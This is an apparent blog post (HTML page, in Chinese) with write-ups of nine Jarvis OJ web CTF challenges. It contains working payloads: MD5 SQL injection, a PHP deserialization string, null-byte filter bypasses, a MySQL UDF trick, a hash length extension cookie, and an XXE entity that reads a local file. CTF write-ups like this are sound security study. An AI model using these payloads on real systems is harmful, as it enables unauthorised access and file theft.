@@ -1,0 +1,547 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.1">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.1">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.1">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.1" color="#222">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.1">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.4.1',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="PORT51一上来看有点懵逼，以为是Burp抓包。最后google后发现应该在vps上（不用vps的话经过路由器可能端口就变了）用以下命令就可以。 1curl --ocal-port http://xxx.com  之前没有接触过curl，只是在docker里面用过一次。 1curl就是：在linux中一个利用URL规则在命令行下工作的文件传输工具，可以说是一款很强大的http命令行工具。它支持文">
+<meta name="keywords" content="WriteUp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Jarvis OJ Web WriteUp(1)">
+<meta property="og:url" content="https://github.com/xx-C1/xx-C1.github.io/2018/09/26/Jarvis OJ Web WriteUp(1)/index.html">
+<meta property="og:site_name" content="xxC1&#39;s blog">
+<meta property="og:description" content="PORT51一上来看有点懵逼，以为是Burp抓包。最后google后发现应该在vps上（不用vps的话经过路由器可能端口就变了）用以下命令就可以。 1curl --ocal-port http://xxx.com  之前没有接触过curl，只是在docker里面用过一次。 1curl就是：在linux中一个利用URL规则在命令行下工作的文件传输工具，可以说是一款很强大的http命令行工具。它支持文">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-10-08T13:20:04.592Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Jarvis OJ Web WriteUp(1)">
+<meta name="twitter:description" content="PORT51一上来看有点懵逼，以为是Burp抓包。最后google后发现应该在vps上（不用vps的话经过路由器可能端口就变了）用以下命令就可以。 1curl --ocal-port http://xxx.com  之前没有接触过curl，只是在docker里面用过一次。 1curl就是：在linux中一个利用URL规则在命令行下工作的文件传输工具，可以说是一款很强大的http命令行工具。它支持文">
+  <link rel="canonical" href="https://github.com/xx-C1/xx-C1.github.io/2018/09/26/Jarvis OJ Web WriteUp(1)/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>Jarvis OJ Web WriteUp(1) | xxC1's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">xxC1's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">想学的太多，懂得的太少。</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+      
+        
+        <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/xx-C1/xx-C1.github.io/2018/09/26/Jarvis OJ Web WriteUp(1)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="xx_C1">
+      <meta itemprop="description" content="Cyberspace Security">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xxC1's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">Jarvis OJ Web WriteUp(1)
+
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              
+                
+              
+
+              <time title="创建时间：2018-09-26 21:26:01" itemprop="dateCreated datePublished" datetime="2018-09-26T21:26:01+08:00">2018-09-26</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2019-10-08 21:20:04" itemprop="dateModified" datetime="2019-10-08T21:20:04+08:00">2019-10-08</time>
+              </span>
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="PORT51"><a href="#PORT51" class="headerlink" title="PORT51"></a>PORT51</h2><p>一上来看有点懵逼，以为是Burp抓包。最后google后发现应该在vps上（不用vps的话经过路由器可能端口就变了）用以下命令就可以。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --ocal-port http://xxx.com</span><br></pre></td></tr></table></figure>
+
+<p>之前没有接触过curl，只是在docker里面用过一次。</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl就是：在linux中一个利用<span class="built_in">URL</span>规则在命令行下工作的文件传输工具，可以说是一款很强大的<span class="keyword">http</span>命令行工具。它支持文件的上传和下载，是综合传输工具，但按传统，习惯称url为下载工具。 由于安装linux的时候很多时候是没有安装桌面的，也意味着没有浏览器，因此这个方法也经常用于测试一台服务器是否可以到达一个网站。 当然也可以进行ip伪造等等测试操作。</span><br></pre></td></tr></table></figure>
+
+<h2 id="LOCALHOST"><a href="#LOCALHOST" class="headerlink" title="LOCALHOST"></a>LOCALHOST</h2><p>burp抓包添加头</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">X-Forwarded-For</span>: 127<span class="selector-class">.0</span><span class="selector-class">.0</span><span class="selector-class">.1</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h2><p>抓包后发现Hint：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"<span class="keyword">select</span> * <span class="keyword">from</span> <span class="string">'admin'</span> <span class="keyword">where</span> <span class="keyword">password</span>=<span class="string">'".md5($pass,true)."'</span><span class="string">"</span></span><br></pre></td></tr></table></figure>
+
+<p>首先想到MD5注入。</p>
+<p>具体原理： </p>
+<ul>
+<li>提价传入的password如果是特殊字符串，那么该字符串转化为MD5再经过PHP转化为字符串后变成： <code>&#39;or&#39;6蒥欓!r,b</code> </li>
+<li>那么最后的sql语句则变成： <code>select * from</code>admin<code>where password=&#39;&#39;or&#39;6蒥欓!r,b&#39;</code> 即成功闭合了’ bypass成功。</li>
+</ul>
+<h2 id="神盾局的秘密"><a href="#神盾局的秘密" class="headerlink" title="神盾局的秘密"></a>神盾局的秘密</h2><p>发现url里面有base64编码。猜测是利用base64访问任意文件。 分别读取index.php，shield.php。审计源码发现存在反序列化漏洞。 通过脚本：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $file = <span class="string">"pctf.php"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $chybeta = <span class="keyword">new</span> Shield();</span><br><span class="line">    print_r(serialize($chybeta));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>生成序列化串：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:6:"Shield":1:&#123;s:4:"file";s:8:"pctf.php";&#125;`</span><br></pre></td></tr></table></figure>
+
+<p>访问： </p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://web.jarvisoj.com:32768/index.php?class=O:6:<span class="number">%22</span>Shield<span class="number">%22</span>:1:&#123;s:4:<span class="number">%22</span>file<span class="number">%22</span>;s:8:<span class="number">%22</span>pctf.php<span class="number">%22</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>查看源码得flag</p>
+<h2 id="IN-A-Mess"><a href="#IN-A-Mess" class="headerlink" title="IN A Mess"></a>IN A Mess</h2><p>右键源码发现注释Hint： index.phps </p>
+<p>访问后,发现源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;!--index.phps--&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'id'</span>])</span><br><span class="line">&#123;</span><br><span class="line">header(<span class="string">'Location: index.php?id=1'</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">$a=$_GET[<span class="string">'a'</span>];</span><br><span class="line">$b=$_GET[<span class="string">'b'</span>];</span><br><span class="line"><span class="keyword">if</span>(stripos($a,<span class="string">'.'</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Hahahahahaha'</span>;</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line">$data = @file_get_contents($a,<span class="string">'r'</span>);</span><br><span class="line"><span class="keyword">if</span>($data==<span class="string">"1112 is a nice lab!"</span> <span class="keyword">and</span>     $id==<span class="number">0</span> <span class="keyword">and</span> strlen($b)&gt;<span class="number">5</span> <span class="keyword">and</span> eregi   (<span class="string">"111"</span>.substr($b,<span class="number">0</span>,<span class="number">1</span>),<span class="string">"1114"</span>) <span class="keyword">and</span>   substr($b,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">require</span>(<span class="string">"flag.txt"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"work harder!harder!  harder!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>题目意思是:GET传三个字符参数，然后每个参数满足以下条件： </p>
+<ul>
+<li><p>①：id是字符，还需要值为0.所以利用php弱类型0a即可让字符0a转化成数字0</p>
+</li>
+<li><p>②：a是一个文件（file_get_contents()函数提取a的内容赋值给data），那么可以是自己vps创建一个文件，也可以利用伪协议php://input。 </p>
+</li>
+<li><p>③：b满足长度大于5，eregi（）里面满足第一个字符为4，substr（）里面又需要满足b首字母！=4.那么我们可以利用%00截断:b=%0011111即可绕过substr和eregi()，eregi（“111”，“1114”）满足。同时%00对strlen不会发生截断。</p>
+<p>饶过后发现<code>/^HT2mCpcvOLf</code>访问自动补全： `</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>web.jarvisoj.com:<span class="number">32780</span><span class="regexp">/%5eHT2mCpcvOLf/i</span>ndex.php?id=<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>猜测是注入漏洞，上sqlmap发现有waf。过滤了空格关键字，空格可以内敛注释绕过，关键字发现只过滤了一次直接双写绕过。然后常规注入得flag。</p>
+</li>
+</ul>
+<h2 id="RE？"><a href="#RE？" class="headerlink" title="RE？"></a>RE？</h2><p>一看题目和.so的文件有点害怕，完全没思路。 google后才知道mysql可以导入进去。</p>
+<p>导入到plugin文件中，利用该文件创建函数help_me（提示）: <code>create function help_me returns string soname &#39;udf.so&#39;</code> </p>
+<p>然后select heilp_me;提示：<code>use getflag function to obtain your flag!</code> 模仿前面创建一个getflag函数调用的flag。</p>
+<h2 id="flag在管理员手里"><a href="#flag在管理员手里" class="headerlink" title="flag在管理员手里"></a>flag在管理员手里</h2><p>首先想到前端认证抓个包发现cookie里面有个guest，改成admin无果。别的地方貌似没有突破口。那就扫一下敏感目录吧。御剑，AWVS无果。 </p>
+<p>发现一个新的py脚本动态多线程工具：weakfilescan 附链接: `</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/ring04h/</span>weakfilescan</span><br></pre></td></tr></table></figure>
+
+<p>命令：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python wyspider<span class="selector-class">.py</span> http:<span class="comment">//web.jarvisoj.com:32778</span></span><br></pre></td></tr></table></figure>
+
+<p>发现有个index.php~，下载notepad++打开发现乱码，挠头。。。 经过尝试发现linux有个查看文件的命令： <code>#file xxx</code> 然后尝试一下发现是： vim swap file 对于swap是交换的意思，google后发现是vim在编辑的时候强制退出而生成的文件，可以用命令： <code>vim -r index.php.swp</code> 来恢复，恢复后发现源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    $auth = <span class="keyword">false</span>;</span><br><span class="line">    $role = <span class="string">"guest"</span>;</span><br><span class="line">    $salt = </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">"role"</span>])) &#123;</span><br><span class="line">        $role = unserialize($_COOKIE[<span class="string">"role"</span>]);</span><br><span class="line">        $hsh = $_COOKIE[<span class="string">"hsh"</span>];</span><br><span class="line">        <span class="keyword">if</span> ($role===<span class="string">"admin"</span> &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[<span class="string">"role"</span>]))) &#123;</span><br><span class="line">            $auth = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $auth = <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $s = serialize($role);</span><br><span class="line">        setcookie(<span class="string">'role'</span>,$s);</span><br><span class="line">        $hsh = md5($salt.strrev($s));</span><br><span class="line">        setcookie(<span class="string">'hsh'</span>,$hsh);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($auth) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;h3&gt;Welcome Admin. Your flag is </span></span><br><span class="line"><span class="string">    &#125; else &#123;</span></span><br><span class="line"><span class="string">        echo "</span>&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;<span class="string">";</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>发现最关键的是要绕过：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$role===<span class="string">"admin"</span> &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[<span class="string">"role"</span>]</span><br></pre></td></tr></table></figure>
+
+<p>利用hash扩展攻击即可，hash拓展攻击下篇详细总结一下。可以利用hashpump直接爆破出role和hsh。不过需要注意题目反转反序列化传入顺序。 最后payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">role = s%<span class="number">3</span>a5%<span class="number">3</span>a<span class="string">"admin"</span>%<span class="number">3</span>b%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%c0%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">80</span>s%<span class="number">3</span>a5%<span class="number">3</span>a<span class="string">"guest"</span>%<span class="number">3</span>b`</span><br><span class="line">hsh = fcdc3840332555511c4e4323f6decb07`</span><br></pre></td></tr></table></figure>
+
+<h2 id="61dctf-admin"><a href="#61dctf-admin" class="headerlink" title="[61dctf]admin"></a>[61dctf]admin</h2><p>抓包后发现貌似和flag在管理员手机的题目有点相似，扫目录发现有robots.txt。访问后发现.php访问的flag提交竟然不对。突然发现flag是flag{hello guest}，而题目是admin显然这是个假flag。</p>
+<p>然后尝试抓包的真flag。</p>
+<h2 id="api调用"><a href="#api调用" class="headerlink" title="api调用"></a>api调用</h2><p>Hint：请设法获得目标机器/home/ctf/flag.txt中的flag值。</p>
+<p>则想办法文件读取。加上题目提示很容易想到调用别的东西来文件读取。</p>
+<p>右键看页面源码发现有json和xml。可能就是xml注入进行任意文件读取。 抓包把content-type=json改成content-type=xml。然后传一段任意文件读取的xml代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY name SYSTEM &quot;file://home/ctf/flag.txt&quot;&gt; ]&gt;  </span><br><span class="line">&lt;root&gt;&amp;name;&lt;/root&gt;</span><br></pre></td></tr></table></figure>
+
+<p>有关于xml的知识之前也是接触过XEE外部实体注入漏洞。后面可能出一篇能用的xml知识。</p>
+
+    </div>
+
+    
+    
+    
+        
+      
+
+      <footer class="post-footer">
+          
+            
+          
+          <div class="post-tags">
+            
+              <a href="/tags/WriteUp/" rel="tag"># WriteUp</a>
+            
+          </div>
+        
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2018/09/23/JarvisOJ-Basic-WriteUp/" rel="next" title="JarvisOJ-Basic-WriteUp">
+                  <i class="fa fa-chevron-left"></i> JarvisOJ-Basic-WriteUp
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/2018/09/27/序列化、反序列化的理解/" rel="prev" title="序列化、反序列化的理解">
+                  序列化、反序列化的理解 <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#PORT51"><span class="nav-number">1.</span> <span class="nav-text">PORT51</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LOCALHOST"><span class="nav-number">2.</span> <span class="nav-text">LOCALHOST</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Login"><span class="nav-number">3.</span> <span class="nav-text">Login</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#神盾局的秘密"><span class="nav-number">4.</span> <span class="nav-text">神盾局的秘密</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IN-A-Mess"><span class="nav-number">5.</span> <span class="nav-text">IN A Mess</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RE？"><span class="nav-number">6.</span> <span class="nav-text">RE？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#flag在管理员手里"><span class="nav-number">7.</span> <span class="nav-text">flag在管理员手里</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#61dctf-admin"><span class="nav-number">8.</span> <span class="nav-text">[61dctf]admin</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#api调用"><span class="nav-number">9.</span> <span class="nav-text">api调用</span></a></li></ol></div>
+        
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">xx_C1</p>
+  <div class="site-description" itemprop="description">Cyberspace Security</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">23</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span>
+        
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">标签</span>
+        
+      </div>
+    
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">xx_C1</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.9.0</div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.4.1</div>
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.4.1"></script><script src="/js/motion.js?v=7.4.1"></script>
+<script src="/js/schemes/pisces.js?v=7.4.1"></script>
+
+<script src="/js/next-boot.js?v=7.4.1"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
